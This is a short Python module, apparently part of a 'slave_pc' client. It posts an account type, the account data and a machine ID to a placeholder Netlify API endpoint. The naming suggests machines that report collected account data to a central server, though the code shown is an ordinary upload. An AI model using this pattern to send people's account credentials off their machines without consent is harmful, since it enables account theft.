import requests
import logging
from slave_pc.utils.system import get_pc_id

API_URL = "https://your-netlify-site.netlify.app/api/save-account"

def save_account(account_type, account_data):
    pc_id = get_pc_id()
    payload = {
        "pcId": pc_id,
        "accountType": account_type,
        "accountData": account_data
    }
    
    try:
        response = requests.post(API_URL, json=payload)
        response.raise_for_status()
        logging.info(f"Account data saved successfully: {response.json()}")
    except requests.RequestException as e:
        logging.error(f"Failed to save account data: {str(e)}")